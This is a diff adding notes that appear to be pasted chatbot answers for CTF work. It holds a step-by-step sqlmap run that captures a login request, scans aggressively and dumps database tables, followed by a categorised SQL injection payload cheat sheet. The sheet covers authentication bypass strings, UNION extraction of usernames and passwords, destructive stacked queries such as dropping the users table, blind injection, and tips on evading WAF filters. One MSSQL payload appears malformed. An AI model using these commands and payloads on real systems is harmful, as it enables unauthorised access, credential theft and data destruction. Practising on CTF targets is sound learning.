@@ -1,0 +1,164 @@
+ here’s a step-by-step sqlmap run for a typical CTF login page.
+This assumes you already have:
+
+    The login page URL (e.g., http://target.site/login.php)
+
+    A test username & password field name (check page HTML source or Burp request)
+
+1️⃣ First, capture the request with Burp Suite
+
+    Open Burp → turn intercept ON
+
+    Try logging in with any fake username/password
+
+    Right-click → Save request to file (e.g., login.req)
+
+2️⃣ Run sqlmap against that request
+
+sqlmap -r login.req --batch --risk=3 --level=5 --threads=5 --dbs
+
+What this does:
+
+    -r login.req → uses your saved HTTP request
+
+    --batch → skips prompts, runs with defaults
+
+    --risk=3 --level=5 → enables more aggressive tests
+
+    --threads=5 → speeds up scanning
+
+    --dbs → enumerates database names if vulnerable
+
+3️⃣ If vulnerable, dump the data
+
+Replace DBNAME and TABLENAME with what you found:
+
+sqlmap -r login.req -D DBNAME -T TABLENAME --dump
+
+4️⃣ Quick inline attack without Burp (if params in URL)
+
+If your target login request looks like:
+
+http://target.site/login.php?user=admin&pass=123
+
+You can run:
+
+sqlmap -u "http://target.site/login.php?user=admin&pass=123" --batch --risk=3 --level=5 --dbs
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Alright — here’s your full categorized SQL Injection cheat sheet for your notes, with all the major syntaxes, concatenation tricks, and comment styles used in CTFs and real-world tests.
+🔹 1. Basic Always-True Conditions
+
+These force the query to return all rows by making the WHERE condition always true.
+
+MySQL / MSSQL style
+
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+" OR 1=1/*
+
+String comparison style
+
+' OR '1'='1'--
+" OR "1"="1"--
+' OR '1'='1'#
+' OR 'a'='a'--
+
+🔹 2. String Concatenation Variations
+
+Used in PostgreSQL, Oracle, SQLite where || concatenates strings.
+
+' || '1'='1'--
+' || '1'='1'#
+' || '1'='1'/*
+' || '1'='1';--
+
+🔹 3. UNION-Based Injections
+
+Used to fetch extra data from other tables.
+
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT 1,2,3--
+
+💡 Number of null values must match the number of columns.
+🔹 4. Stacked Queries (if allowed)
+
+Works if the database supports multiple queries in a single request.
+
+'; DROP TABLE users;--
+'; UPDATE users SET admin=1 WHERE id=1;--
+'; INSERT INTO logins(username,password) VALUES('hacker','pass');--
+
+🔹 5. Comment Styles
+
+Different DB engines accept different comment syntaxes.
+
+--       (double dash + space)  ✅ MySQL, MSSQL, PostgreSQL
+#        ✅ MySQL only
+/* ... */ ✅ MySQL, MSSQL, PostgreSQL
+
+Example:
+
+' OR 1=1-- 
+' OR 1=1# 
+' OR 1=1/*
+
+🔹 6. Time-Based Blind SQL Injection
+
+Used when output isn’t visible, but execution time reveals true/false.
+
+MySQL
+
+' OR IF(1=1,SLEEP(5),0)--
+
+PostgreSQL
+
+' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+MSSQL
+
+' OR IF(1=1) WAITFOR DELAY '0:0:5'--
+
+🔹 7. Error-Based Injection
+
+Forcing errors to extract data.
+
+MySQL
+
+' AND EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--
+
+PostgreSQL
+
+' AND CAST((SELECT version()) AS int)--
+
+🔹 8. Order By & Column Count Enumeration
+
+Find the number of columns in the result set.
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+When it errors, the last working number is the column count.
+🔹 9. Authentication Bypass Quickies
+
+' OR ''='
+" OR ""="
+') OR ('1'='1
+admin'-- 
+admin' #
+admin'/*
+
+✅ Pro tip for CTFs & bug bounty: Always adapt to the database type first.
+
+    MySQL / MSSQL → use OR, #, --, /* */
+
+    PostgreSQL / Oracle / SQLite → use || for concatenation
+
+    Always check for WAF filters and URL encoding tricks if payloads get blocked.
